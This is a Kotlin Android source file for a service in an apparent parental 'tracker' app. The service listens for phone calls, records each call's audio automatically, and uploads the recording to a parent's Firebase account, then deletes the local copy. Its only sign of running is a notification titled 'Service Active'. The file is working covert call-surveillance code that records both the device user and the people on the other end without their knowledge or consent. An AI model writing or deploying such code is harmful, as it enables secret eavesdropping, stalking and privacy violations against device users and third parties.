package com.abuzahra.tracker.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.abuzahra.tracker.SharedPrefsManager
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class CallRecorderService : Service() {
    private var recorder: MediaRecorder? = null
    private var outputFile: String? = null
    private var isRecording = false
    private val CHANNEL_ID = "call_rec_channel"

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(3, createNotification())
        listenToCallState()
    }

    private fun listenToCallState() {
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        tm.listen(object : android.telephony.PhoneStateListener() {
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                when (state) {
                    TelephonyManager.CALL_STATE_OFFHOOK -> if (!isRecording) startRecording()
                    TelephonyManager.CALL_STATE_IDLE -> if (isRecording) stopRecordingAndUpload()
                }
            }
        }, android.telephony.PhoneStateListener.LISTEN_CALL_STATE)
    }

    private fun startRecording() {
        try {
            val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val fileName = "CALL_$timeStamp.3gp"
            outputFile = File(cacheDir, fileName).absolutePath

            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(outputFile)
                prepare()
                start()
            }
            isRecording = true
            Log.d("CallRecorder", "Recording started")
        } catch (e: Exception) { Log.e("CallRecorder", "Failed to start", e) }
    }

    private fun stopRecordingAndUpload() {
        try {
            recorder?.apply { stop(); release() }
            recorder = null; isRecording = false
            uploadAudioFile(outputFile)
        } catch (e: Exception) { Log.e("CallRecorder", "Failed to stop", e) }
    }

    private fun uploadAudioFile(path: String?) {
        if (path == null) return
        val parentId = SharedPrefsManager.getParentUid(this) ?: return
        val deviceId = SharedPrefsManager.getDeviceId(this) ?: return
        val file = File(path)
        val uri = android.net.Uri.fromFile(file)
        val storageRef = FirebaseStorage.getInstance().reference.child("calls/$parentId/$deviceId/${file.name}")

        CoroutineScope(Dispatchers.IO).launch {
            try {
                storageRef.putFile(uri).await()
                val downloadUrl = storageRef.downloadUrl.await().toString()
                val data = hashMapOf("type" to "audio", "url" to downloadUrl, "timestamp" to System.currentTimeMillis(), "phone" to "Unknown")
                FirebaseFirestore.getInstance().collection("parents").document(parentId).collection("children").document(deviceId).collection("calls").add(data).await()
                file.delete()
            } catch (e: Exception) { Log.e("CallRecorder", "Upload Failed", e) }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Call Recorder", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }
    private fun createNotification(): Notification = NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Service Active").setSmallIcon(android.R.drawable.ic_btn_speak_now).build()
    override fun onBind(intent: Intent?): IBinder? = null
}
